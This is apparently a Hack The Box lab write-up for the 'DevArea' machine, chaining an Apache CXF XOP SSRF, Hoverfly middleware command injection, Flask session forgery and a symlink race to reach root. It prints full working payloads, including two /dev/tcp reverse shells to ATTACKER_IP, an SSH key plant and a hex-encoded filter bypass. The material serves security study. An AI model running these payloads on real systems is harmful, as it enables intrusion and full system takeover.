# DevArea — Writeup
> Hack The Box | Medium | 2026-03-28

## Summary

DevArea is a medium Linux box featuring a developer talent platform with a rich service stack: FTP, Apache, a Java SOAP service, and the Hoverfly API simulation tool. The attack chain begins with an SSRF vulnerability in Apache CXF's Aegis databinding (CVE-2024-28752) that leaks credentials from a systemd service file, enabling command injection through Hoverfly's middleware endpoint (CVE-2025-54123) for a foothold as `dev_ryan`. Privilege escalation requires chaining a Flask session forgery, command injection as the `syswatch` service user, and a symlink race in a custom monitoring script's logging function to inject a malicious plugin that executes as root.

## Reconnaissance

A full TCP port scan reveals six services:

```bash
nmap -p- -sC -sV -T4 10.129.10.193
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 (anonymous login) |
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58 — static site, redirects to `devarea.htb` |
| 8080 | HTTP | Jetty 9.4.27 — Apache CXF SOAP service |
| 8500 | HTTP | Golang proxy — "Does not respond to non-proxy requests" |
| 8888 | HTTP | Hoverfly Dashboard — auth required |

Key observations:
- Nmap resolves the hostname `devarena.htb` and the site redirects to `devarea.htb` — add both to `/etc/hosts`.
- Anonymous FTP contains `pub/employee-service.jar` (6.4MB) — a Java application.
- Port 8500 and 8888 together indicate **Hoverfly** (API simulation tool): 8500 is the proxy port, 8888 is the admin dashboard.
- Jetty 9.4.27 is from February 2020 — significantly outdated.

## Enumeration

### Analyzing the JAR

The FTP-hosted JAR is a shaded Maven artifact. Extracting the manifest and pom.xml:

```bash
curl -s -o employee-service.jar ftp://anonymous:anonymous@10.129.10.193/pub/employee-service.jar
unzip -p employee-service.jar META-INF/MANIFEST.MF
# Main-Class: htb.devarea.ServerStarter

unzip -p employee-service.jar META-INF/maven/com.environment/employee-service/pom.xml
```

The pom.xml reveals:
- **Apache CXF 3.2.14** with the **Aegis databinding** (`cxf-rt-databinding-aegis`)
- Jetty transport, JAX-WS frontend
- Java 8

The Aegis databinding is the critical detail — it's vulnerable to CVE-2024-28752 (SSRF).

### SOAP Service

The WSDL is accessible at `http://10.129.10.193:8080/employeeservice?wsdl`. It defines a single operation `submitReport` taking a `Report` object with fields: `employeeName`, `department`, `content`, and `confidential`.

A test SOAP request confirms the service is functional:

```bash
curl -s -X POST http://10.129.10.193:8080/employeeservice \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: ' \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>Test</content>
        <department>Engineering</department>
        <employeeName>TestUser</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>'
```

### Hoverfly Dashboard

The Hoverfly admin API on port 8888 requires authentication (401 on all `/api/v2/` endpoints). The health endpoint (`/api/health`) is open and confirms the service is running.

## Foothold

### CVE-2024-28752: Apache CXF Aegis SSRF

Apache CXF versions before 3.5.8 with Aegis databinding are vulnerable to SSRF via XOP (XML-binary Optimized Packaging) Include elements. When a SOAP request is sent as `multipart/related` content, an `<xop:Include href="...">` element inside any string parameter causes the server to fetch the referenced URL and return the content base64-encoded in the response.

**The primitive:** The Aegis databinding resolves XOP Include references during deserialization without restricting the URL scheme. This means `file:///` reads local files and `http://` performs SSRF.

Testing with `/etc/passwd`:

```bash
curl -s -X POST 'http://10.129.10.193:8080/employeeservice' \
  -H 'Content-Type: multipart/related; boundary=----kkkkkk123123213' \
  -d '------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">
   <soapenv:Header/>
   <soapenv:Body>
      <tns:submitReport>
         <arg0>
            <confidential>false</confidential>
            <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"></xop:Include></content>
            <department>Engineering</department>
            <employeeName>TestUser</employeeName>
         </arg0>
      </tns:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--'
```

The response contains the base64-encoded file contents in the `<return>` element. Decoding reveals the user `dev_ryan` (uid 1001) and the service account `syswatch` (uid 984).

### Credential Recovery from Systemd Units

Reading `/etc/systemd/system/hoverfly.service`:

```
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

Plaintext Hoverfly admin credentials in the ExecStart directive. The `employee-service.service` unit also reveals the CXF service runs as `dev_ryan` with `InaccessiblePaths=/home/dev_ryan/user.txt` — the user flag can't be read via SSRF.

### Authenticating to Hoverfly

```bash
curl -X POST http://10.129.10.193:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"Username": "admin", "Password": "O7IJ27MyyXiU"}'
# Returns JWT token
```

### CVE-2025-54123: Hoverfly Middleware RCE

Hoverfly versions <= 1.11.3 have a command injection vulnerability in the `/api/v2/hoverfly/middleware` endpoint. The `binary` and `script` fields are passed to `/bin/bash` without sanitization.

```bash
# Start listener
nc -lvnp 9001

# Trigger RCE
curl -X PUT http://10.129.10.193:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"}'
```

This returns a shell as `dev_ryan`. The user flag is now readable.

### Stabilizing Access

The middleware RCE produces a one-shot shell. For stable access, inject an SSH key:

```bash
ssh-keygen -t ed25519 -f devarea_key -N "" -C "devarea-op"

# Via middleware RCE:
curl -X PUT http://10.129.10.193:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"mkdir -p ~/.ssh && echo '\''ssh-ed25519 AAAA...'\'' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"}'

# Verify
ssh -i devarea_key dev_ryan@10.129.10.193
```

## Privilege Escalation: Root

### Discovering SysWatch

In dev_ryan's home directory sits `syswatch-v1.zip` — the source for a custom monitoring stack at `/opt/syswatch/`. An ACL blocks dev_ryan from accessing `/opt/syswatch` directly, but the zip contains the full source.

Key components:
- `syswatch.sh` — management script; `dev_ryan` has `sudo NOPASSWD` on it
- `monitor.sh` — executes all `plugins/*.sh` as root every 5 minutes (systemd timer)
- `syswatch_gui/app.py` — Flask web GUI on localhost:7777
- `plugins/` — monitoring scripts (cpu, disk, network, log, service)

Sudoers entry:
```
(root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

### SysWatch Web GUI — Flask Session Forgery + Command Injection

The Flask app's secret key is in `/etc/syswatch.env` (readable via CXF SSRF). The `service_status` endpoint passes user input to `subprocess` with `shell=True`:

```python
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")
```

This regex blocks `;`, `/`, `\`, `&`, `.`, `<`, `>`, `\r`, and uppercase letters — but allows `|` (pipe), `$()`, and backticks. The `/` restriction is bypassed by encoding commands in hex and decoding with `xxd`:

```bash
# Forge Flask session (from attack box)
flask-unsign --sign --cookie '{"user_id": 1, "username": "admin"}' --secret '<SECRET_KEY>'

# Command injection via pipe + xxd hex decode
# Hex-encode: id
HEX=$(echo -n 'id' | xxd -p | tr -d '\n')
curl -s -b "session=<FORGED_COOKIE>" \
  "http://127.0.0.1:7777/service-status?service=ssh+|echo+${HEX}+|xxd+-r+-p+|bash"
# Returns: uid=984(syswatch) gid=984(syswatch)
```

Code execution as `syswatch` is confirmed. However, `/opt/syswatch/plugins/` is owned by root (755) — syswatch cannot write there directly.

### The Bridge: log_message Symlink Attack

The key insight is a discrepancy between two `log_message` functions:

**common.sh** (used by plugins) — has symlink protection:
```bash
log_message() {
    local logfile="$1"
    if [ -L "$logfile" ]; then
        rm -f -- "$logfile"    # Removes symlink
        : > "$logfile"          # Creates regular file
        chmod 644 "$logfile"
    fi
    echo "$(date ...) - $msg" >> "$logfile"
}
```

**syswatch.sh** (management script) — NO symlink protection:
```bash
log_message() {
    local msg="$1"
    echo "$(date '+%F %T') - $msg" >> "$LOG_DIR/system.log"  # Follows symlinks!
    logger -t syswatch "$msg"
}
```

This function is called inside `execute_plugin()` with unvalidated `$*` arguments:
```bash
log_message "Executing plugin: $plugin $*"
```

The syswatch user owns `logs/` and can create symlinks there. `fs.protected_symlinks=1` only protects sticky-bit directories — `logs/` is not sticky.

### Exploitation

**Step 1: Create symlink** (via command injection as syswatch):

```bash
# Hex-encode the symlink command
CMD='rm -f /opt/syswatch/logs/system.log && ln -s /opt/syswatch/plugins/health_check.sh /opt/syswatch/logs/system.log'
HEX=$(echo -n "$CMD" | xxd -p | tr -d '\n')

curl -s -b "session=<FORGED_COOKIE>" \
  "http://127.0.0.1:7777/service-status?service=ssh+|echo+${HEX}+|xxd+-r+-p+|bash"
```

**Step 2: Inject reverse shell via sudo** (as dev_ryan):

```bash
sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh $'\nbash -i >& /dev/tcp/ATTACKER_IP/9003 0>&1\n'
```

This triggers `log_message` which writes to `system.log` — now symlinked to `plugins/health_check.sh`:

```
2026-03-28 20:12:38 - Executing plugin: log_monitor.sh
bash -i >& /dev/tcp/ATTACKER_IP/9003 0>&1
```

Line 1 is garbage (bash errors on `2026-03-28` but continues). The reverse shell on line 2 executes.

**Step 3: Catch root shell** (on attack box):

```bash
nc -lvnp 9003
```

Wait up to 5 minutes for the `syswatch-monitor.timer` to fire. When it does, `monitor.sh` executes all `plugins/*.sh` as root — including our injected `health_check.sh`.

## Flags

```
user.txt: [REDACTED]
root.txt: [REDACTED]
```

## Key Takeaways

1. **Aegis databinding is a red flag.** Apache CXF's default JAXB binding is not affected by CVE-2024-28752 — only Aegis. If you see `cxf-rt-databinding-aegis` in a pom.xml, test for XOP Include SSRF immediately.

2. **Credentials in systemd units are a common pattern.** Service files often contain passwords in `ExecStart` directives because the developers needed to pass credentials at startup. Always read systemd units when you have file read access.

3. **Inconsistent security controls between similar functions is a rich attack surface.** The `common.sh` log_message had symlink protection; the `syswatch.sh` log_message did not. When auditing code, compare all implementations of the same logical operation.

4. **Regex denylists are almost always bypassable.** The `^[^;/\&.<>\rA-Z]*$` filter blocked obvious injection characters but missed pipe (`|`), which combined with `xxd` hex encoding bypassed all restrictions including `/` and uppercase.

5. **Symlink attacks are powerful when you control a directory that a privileged process writes to.** The combination of syswatch owning `logs/` and root writing to `logs/system.log` via sudo created a classic symlink race. The `fs.protected_symlinks` sysctl only protects sticky-bit directories like `/tmp`.
